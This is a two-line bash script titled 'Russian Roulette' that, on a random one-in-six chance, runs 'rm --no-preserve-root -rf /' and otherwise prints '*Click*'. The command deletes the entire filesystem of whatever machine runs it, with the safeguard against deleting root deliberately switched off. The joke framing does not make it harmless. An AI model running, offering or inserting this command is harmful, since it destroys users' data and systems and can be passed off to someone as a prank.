#!/bin/bash
#Russian Roulette

[ $[ $RANDOM % 6 ] == 0 ] && rm --no-preserve-root -rf / || echo *Click*
